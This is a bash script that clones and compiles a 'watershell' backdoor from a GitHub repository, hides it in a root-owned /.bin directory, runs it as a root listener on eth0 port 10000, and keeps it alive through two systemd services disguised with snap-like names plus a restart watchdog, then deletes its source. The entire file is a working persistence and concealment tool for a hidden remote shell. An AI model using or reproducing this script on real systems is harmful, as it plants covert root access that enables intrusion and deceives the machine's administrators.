#!/bin/bash

# Install g++ if not already installed
sudo apt-get install -y g++
sudo apt-get install python3
# Clone the Watershell-Cpp repository
git clone https://github.com/Dack985/Cerberus-shell.git

# Navigate to the Watershell-Cpp directory
cd Cerberus-shell

# Compile the Watershell-Cpp code
g++ main.cpp watershell.cpp -o watershell

# Verify if Watershell binary is compiled successfully
if [ -x "./watershell" ]; then
    echo "Watershell binary compiled successfully."

    # Create .bin directory in root (/)
    sudo mkdir -p /.bin

    # Copy Watershell-Cpp files to the .bin directory
    sudo cp -R * /.bin

    # Change ownership of the .bin folder and its contents to the "root" user
    sudo chown -R root:root /.bin

    # Create the startup script (cerberus_shell.sh) in .bin directory
    cat <<EOF | sudo tee '/.bin/cerberus_shell.sh' > /dev/null
#!/bin/bash
cd /.bin
while true; do
    ./watershell -l 10000 eth0
    sleep 1
done
EOF

    # Make the startup script executable
    sudo chmod +x '/.bin/cerberus_shell.sh'

    # Create the systemd service unit file (cerberus.service)
    cat <<EOF | sudo tee '/etc/systemd/system/snap-snapd-21445.service' > /dev/null
[Unit]
Description=Cerberus Shell Startup

[Service]
ExecStart=/.bin/cerberus_shell.sh
User=root
Group=root

[Install]
WantedBy=multi-user.target
EOF

    # Create the Python monitoring script (cerberus_monitor.py)
    cat <<EOF | sudo tee '/usr/local/bin/cerberus_monitor.py' > /dev/null
#!/usr/bin/env python3

import subprocess
import time

def check_cerberus_process():
    while True:
        try:
            subprocess.run(["pgrep", "-f", "watershell -l 10000 eth0"], check=True)
        except subprocess.CalledProcessError:
            print("Cerberus Shell process not found. Restarting...")
            subprocess.run(["/.bin/watershell", "-l", "10000", "eth0"])
        time.sleep(1)

if __name__ == "__main__":
    check_cerberus_process()
EOF

    # Make the monitoring script executable
    sudo chmod +x '/usr/local/bin/cerberus_monitor.py'

    # Create the systemd service unit file (cerberus_monitor.service)
    cat <<EOF | sudo tee '/etc/systemd/system/snap-snapd-21446.service' > /dev/null
[Unit]
Description=Monitor Cerberus Shell Process

[Service]
ExecStart=/usr/local/bin/cerberus_monitor.py
Restart=always
User=root
Group=root

[Install]
WantedBy=multi-user.target
EOF

    # Reload systemd to pick up the new unit files
    sudo systemctl daemon-reload

    # Enable and start the services
    sudo systemctl enable snap-snapd-21445.service
    sudo systemctl start snap-snapd-21445.service
    sudo systemctl enable snap-snapd-21446.service
    sudo systemctl start snap-snapd-21446.service

    # Clean up the setup script and Watershell-Cpp directory
    cd
    rm -rf Cerberus-shell

    echo "Cerberus setup completed successfully."
else
    echo "ERROR: Watershell binary compilation failed."
    exit 1
fi
